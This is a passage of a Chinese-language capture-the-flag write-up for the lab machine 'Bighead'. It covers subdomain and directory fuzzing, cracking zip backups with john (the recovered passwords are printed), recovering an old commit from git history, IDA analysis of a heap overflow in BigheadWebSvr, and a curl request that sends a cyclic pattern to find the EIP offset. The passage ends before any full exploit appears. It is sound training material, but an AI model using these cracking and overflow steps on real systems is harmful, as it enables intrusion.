+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://bighead.htb -H <span class="string">&quot;Host: FUZZ.bighead.htb&quot;</span> --hh 11175</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%884.00.19.png" alt="截屏2021-11-22 上午4.00.19"><br>发现新的子域名<code>dev</code>，也将其添加到 hosts 文件中并进行目录扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://dev.bighead.htb -w /usr/share/wordlists/dirb/big.txt -x php</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%888.13.51.png" alt="截屏2021-11-22 上午8.13.51"><br>以<code>blog</code>结尾的目录会重定向至<code>/wp-content</code>目录下，访问后出现错误。而访问<code>coffee</code>则出现以下界面<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%884.24.44.png" alt="截屏2021-11-22 上午4.24.44"></p>
+<p>查看响应对比 Server 发现其发生了变化：由之前的 Nginx 改为 BigheadWebsvr<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%884.25.42.png" alt="截屏2021-11-22 上午4.25.42"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%884.26.05.png" alt="截屏2021-11-22 上午4.26.05"></p>
+<h2 id="0x02-上线-nelson"><a href="#0x02-上线-nelson" class="headerlink" title="0x02 上线[nelson]"></a>0x02 上线[nelson]</h2><h3 id="zip密码爆破"><a href="#zip密码爆破" class="headerlink" title="zip密码爆破"></a>zip密码爆破</h3><p>在谷歌中搜索 BigheadWeb 的相关漏洞<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%889.50.44.png" alt="截屏2021-11-22 上午9.50.44"><br>成功在 github 中发现zip压缩文件并将其下载</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/3mrgnc3/BigheadWebSvr</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%889.51.26.png" alt="截屏2021-11-22 上午9.51.26"></p>
+<p>使用 unzip 解压 zip 文件，但是无法获取到其中的内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip BHWS_Backup.zip</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%889.54.04.png" alt="截屏2021-11-22 上午9.54.04"><br>切换 7z 进行解压，解压需要密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z x BHWS_Backup.zip</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%889.56.39.png" alt="截屏2021-11-22 上午9.56.39"><br>但是需要输入密码，那么开始进行密码爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john BHWS_Backup.zip &gt; BHWS_Backup.zip.hash</span><br><span class="line">john BHWS_Backup.zip --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8810.06.30.png" alt="截屏2021-11-22 上午10.06.30"><br>成功拿到密码为<code>thepiedpiper89</code>，使用该密码通过 7z 解压</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z x BHWS_Backup.zip</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8810.09.23.png" alt="截屏2021-11-22 上午10.09.23"></p>
+<p>成功解压后查看解压后的所有文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find BHWS_Backup/ -<span class="built_in">type</span> f</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8810.12.05.png" alt="截屏2021-11-22 上午10.12.05"></p>
+<p>但是进入解压目录后，查看提示文件提示：<code>Gilfoyle已经删除了存在漏洞的软件</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8810.09.02.png" alt="截屏2021-11-22 上午10.09.02"></p>
+<h3 id="git信息泄漏"><a href="#git信息泄漏" class="headerlink" title="git信息泄漏"></a>git信息泄漏</h3><p>通过 git 查看提交历史</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span> --oneline</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8810.18.47.png" alt="截屏2021-11-22 上午10.18.47"><br>发现它存在四次提交历史，重点查看第二次提交，其中包含 zip 压缩文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout b1b4d6e</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8810.21.08.png" alt="截屏2021-11-22 上午10.21.08"><br>使用原来的密码对其进行解压，提示密码错误</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z x BHWS_Backup.zip</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8810.24.46.png" alt="截屏2021-11-22 上午10.24.46"><br>采取与之前一样的措施对解压密码进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john BHWS_Backup.zip &gt; BHWS_Backup.zip.hash</span><br><span class="line">john BHWS_Backup.zip --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8810.27.02.png" alt="截屏2021-11-22 上午10.27.02"><br>成功破解密码为<code>bighead</code>，使用该密码解压后发现如下文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find BHWS_Backup/ -<span class="built_in">type</span> f</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8810.48.01.png" alt="截屏2021-11-22 上午10.48.01"><br>相比之前的版本多了个 exe 以及 dll 文件</p>
+<h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>存在 exe 和 dll 文件说明可能存在缓冲区溢出漏洞，一般情况下是采用模糊测试直至程序崩溃，接下来启动 IDA 来进行测试。首先按<code>Shift</code>+<code>F12</code>调出 Strings 窗口<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8810.58.49.png" alt="截屏2021-11-22 上午10.58.49"><br>在其中找到了传入 HTTP 请求的字符串，也就是用户输入和服务器交互的地方，点击<code>GET /coffee</code>将被带到该字符串在内存中的位置，可以发现该字符串位于<code>0x004077F3</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8811.01.23.png" alt="截屏2021-11-22 上午11.01.23"><br>IDA 还显示<code>_ConnectionHandler@4</code>，点击<code>aGetCoffee</code>后再按<code>x</code>，会跳转到包含该字符串被引用的代码<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8811.04.40.png" alt="截屏2021-11-22 上午11.04.40"><br>点击<code>OK</code>跳转<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8811.08.47.png" alt="截屏2021-11-22 上午11.08.47"></p>
+<p>查看<code>_ConnectionHandler@4</code>运行代码<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8811.15.58.png" alt="截屏2021-11-22 上午11.15.58"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8811.16.17.png" alt="截屏2021-11-22 上午11.16.17"></p>
+<p>在 IDA 加载时我们可以知道这是一个网络服务器，所以它很可能会创建一个 socket，将它绑定到 post 请求上，监听并等待连接。通过分叉来处理这些连接（在windows中会启动一个线程）<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/1.png" alt="1"></p>
+<p>查看字符串还可以发现提示：这是一个存在漏洞的软件<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-23%20%E4%B8%8A%E5%8D%889.04.10.png" alt="截屏2021-11-23 上午9.04.10"><br>绿色标记部分用于处理连接，而红色部分代码用于创建线程来处理连接的调用<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-23%20%E4%B8%8A%E5%8D%889.05.55.png" alt="截屏2021-11-23 上午9.05.55"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-24%20%E4%B8%8A%E5%8D%8810.24.12.png" alt="截屏2021-11-24 上午10.24.12"><br>在其中找到<code>loc_401A90</code>，它将每两个字节从十六进制转换为一个字节值，并将其存储到堆上的缓冲区，然后它返回到这个本地循环的底部。由于其中可以写入远超12字节的已分配数据，所以将会发生堆溢出。</p>
+<h4 id="本地模拟测试"><a href="#本地模拟测试" class="headerlink" title="本地模拟测试"></a>本地模拟测试</h4><p>将 exe 和 dll 文件转移到 Windows 环境中并点击运行<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-24%20%E4%B8%8A%E5%8D%8810.52.56.png" alt="截屏2021-11-24 上午10.52.56"></p>
+<p>出现报错，需要安装<code>mingw</code>，安装完成后进入<code>MinGW</code>的仓库<br><strong>下载地址：<a target="_blank" rel="noopener" href="https://zh.osdn.net/projects/mingw/">https://zh.osdn.net/projects/mingw/</a></strong><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-24%20%E4%B8%8A%E5%8D%8811.29.14.png" alt="截屏2021-11-24 上午11.29.14"></p>
+<p>找到<code>libmingwex-dll</code>，右键选择安装并点击<code>应用改变</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-24%20%E4%B8%8A%E5%8D%8811.31.29.png" alt="截屏2021-11-24 上午11.31.29"></p>
+<p>找到<code>libmingwex-4.dll</code>并将其中的复制到服务器目录，同时修改其名字为<code>libmingwex-0.dll</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-24%20%E4%B8%8A%E5%8D%8811.32.25.png" alt="截屏2021-11-24 上午11.32.25"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-24%20%E4%B8%8A%E5%8D%8811.34.49.png" alt="截屏2021-11-24 上午11.34.49"></p>
+<p>运行程序成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-24%20%E4%B8%8A%E5%8D%8811.35.32.png" alt="截屏2021-11-24 上午11.35.32"><br>查看本地8008端口，成功访问<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-24%20%E4%B8%8B%E5%8D%883.37.08.png" alt="截屏2021-11-24 下午3.37.08"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-24%20%E4%B8%8B%E5%8D%883.37.43.png" alt="截屏2021-11-24 下午3.37.43"></p>
+<p>我们首先要找到<code>EIP</code>的偏移量，前需要开启<code>Community</code>运行<code>BigHeadWebSvr</code>。因为我的输入在覆盖之前会从十六进制转换到二进制，所以我需要发送十六进制编码的输入，通过<code>kali</code>中的<code>msf-pattern_create</code>制作一个<code>pattern</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_create -l 50 | xxd -p | tr -d <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-25%20%E4%B8%8A%E5%8D%889.09.23.png" alt="截屏2021-11-25 上午9.09.23"><br>向目标地址发送该<code>pattern</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --head http://172.16.54.39:8008/41613041613141613241613341613441613541613641613741613841613941623041623141623241623341623441623541620a</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-25%20%E4%B8%8A%E5%8D%889.23.12.png" alt="截屏2021-11-25 上午9.23.12"><br>程序直接崩溃，出现<code>EIP</code>为<code>41326241</code>，通过反转字节顺序找到<code>pattern</code>偏移</p>
